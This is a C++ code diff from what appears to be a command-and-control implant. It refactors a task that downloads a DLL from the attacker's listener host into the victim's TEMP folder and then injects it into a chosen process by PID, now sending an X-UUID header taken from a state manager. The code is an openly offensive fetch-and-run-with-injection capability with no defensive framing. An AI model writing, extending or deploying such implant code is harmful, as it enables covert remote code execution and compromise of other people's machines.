@@ -3,7 +3,7 @@
 namespace Task
 {
     // Load DLL and spawn modules.
-    std::wstring Dll(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc)
+    std::wstring Dll(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc)
     {
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
@@ -12,24 +12,23 @@ namespace Task
         std::wstring wDllDest = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllDestName;
         size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);
 
+        std::wstring wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n";
+
         // Download a DLL file
-        BOOL bResults = System::Http::DownloadFile(
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
+        if (!System::Http::DownloadFile(
+            sm.GetHConnect(),
+            sm.GetListenerHost(),
+            sm.GetListenerPort(),
+            sm.GetReqPathDownload(),
+            wHeaders.c_str(),
             wSrc,
             wDllDest
-        );
-        if (!bResults)
-        {
+        )) {
             return L"Error: Failed to download DLL file.";
         }
 
-
         // Inject DLL
-        bResults = Technique::Injection::DllInjection(dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize);
-        if (!bResults)
+        if (!Technique::Injection::DllInjection(dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize))
         {
             return L"Error: Failed to injection DLL.";
         }
